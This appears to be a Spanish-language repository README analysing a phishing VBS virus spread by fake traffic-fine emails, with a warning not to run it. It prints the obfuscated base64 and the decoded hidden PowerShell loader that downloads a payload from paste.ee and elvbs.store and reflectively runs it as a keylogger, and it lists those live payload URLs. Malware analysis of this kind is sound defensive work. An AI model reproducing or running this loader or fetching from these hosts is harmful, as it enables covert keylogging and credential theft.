# virus-sandbox

- ⚠️ NO ejecutar "Orden del Comparendo Electronico.vbs", este archivo es un virus que circula en diferentes correos electrónicos falsos. Para más información consulte [aquí] 
- ✔️ "decodificado.py" es seguro, elimina la ofuscación del virus que consiste en simples reemplazos e inversiones de strings. 

## :supervillain: El virus descifrado:
Con el archivo decodificado.py se puede observar que el virus contiene el siguiente código en base64:

Código base 64
```
JGRsbCA9ICcwLzhKTWgxL3IvZWUuZXRzYXAvLzpzcHR0aCc7JFJ1bXBlRCA9IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCAkZGxsWy0xLi4tJGRsbC5MZW5ndGhdIC1qb2luICcnICk7W0J5dGVbXV0gJFJ1bXBlID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggJFJ1bXBlRFstMS4uLSRSdW1wZUQuTGVuZ3RoXSAtam9pbiAnJyApO1tSZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZCgkUnVtcGUpLkdldFR5cGUoJ2VudC5DbGFzczEnKS5HZXRNZXRob2QoJ1J1bicpLkludm9rZSgkbnVsbCwgW29iamVjdFtdXSAoJ3R4dC4yNjYwMjQwODIxMS9zYnYvZXJvdHMuc2J2bGUvLzpwdHRoJykp;$OWjuxD =
```


```
[SystemBolSULeYnpTextBolSULeYnpEncoding]::ASCIIBolSULeYnpGetString( [SystemBolSULeYnpConvert]::FromBase64String($Codigo) );powershellBolSULeYnpexe -windowstyle hidden -ExecutionPolicy Bypass -NoProfile -Command $OWjuxD
powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -NoProfile -Command
```



## :mage_man: El base 64 decodificado:
```
powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -NoProfile -Command
$dll = '0/8JMh1/r/ee.etsap//:sptth';$RumpeD = (New-Object Net.WebClient).DownloadString( $dll[-1..-$dll.Length] -join '' );[Byte[]] $Rumpe = [System.Convert]::FromBase64String( $RumpeD[-1..-$RumpeD.Length] -join '' );[Reflection.Assembly]::Load($Rumpe).GetType('ent.Class1').GetMethod('Run').Invoke($null, [object[]] ('txt.26602408211/sbv/erots.sbvle//:ptth'))9h
```

Pueden evidenciarse dos urls desde donde se descargan otras cadenas en base64 que contienen un keylogger:
- https://paste.ee/r/1hMJ8/0
- http://elvbs.store/vbs/11280420662.txt


### Existen otros 170 archivos, muy posiblemente otras variaciones del virus en http://elvbs.store/vbs


[aquí]: https://www.virus.com.co/318/usted-presenta-con-comparendo-por-foto-multa
